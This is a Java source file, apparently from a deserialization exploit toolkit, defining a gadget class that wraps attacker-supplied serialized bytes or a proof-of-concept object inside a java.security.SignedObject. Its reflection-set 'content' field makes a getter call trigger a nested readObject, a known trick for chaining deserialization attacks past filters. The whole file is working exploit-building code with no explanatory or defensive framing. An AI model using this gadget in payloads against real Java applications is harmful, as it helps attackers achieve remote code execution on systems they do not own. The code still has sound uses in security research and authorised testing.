package xyz.eki.marshalexp.gadget.jdk;
import xyz.eki.marshalexp.utils.ReflectUtils;

import java.io.Serializable;
import java.security.*;


/**
 * getter-> readObject
 */
public class GSignedObject {
    public static java.security.SignedObject getSignedObject2Deserialize(byte[] serialBytes) throws Exception{
//Create a key
        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DSA", "SUN");
        SecureRandom random = SecureRandom.getInstance("SHA1PRNG", "SUN");
        keyGen.initialize(1024, random);
// create a private key
        PrivateKey signingKey = keyGen.generateKeyPair().getPrivate();
// create a Signature
        Signature signingEngine = Signature.getInstance("DSA");
        signingEngine.initSign(signingKey);
// create a simple object
        Serializable obj = new String("Whatever");
// sign our object
        SignedObject so = new SignedObject(obj, signingKey, signingEngine);
        ReflectUtils.setFieldValue(so,"content",serialBytes);
        return so;
    }

    public static java.security.SignedObject getSignedObject2Deserialize(Object poc) throws Exception{

//Create a key
        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DSA", "SUN");
        SecureRandom random = SecureRandom.getInstance("SHA1PRNG", "SUN");
        keyGen.initialize(1024, random);
// create a private key
        PrivateKey signingKey = keyGen.generateKeyPair().getPrivate();
// create a Signature
        Signature signingEngine = Signature.getInstance("DSA");
        signingEngine.initSign(signingKey);
// sign our object
        SignedObject so = new SignedObject((Serializable) poc, signingKey, signingEngine);
        return so;
    }
}
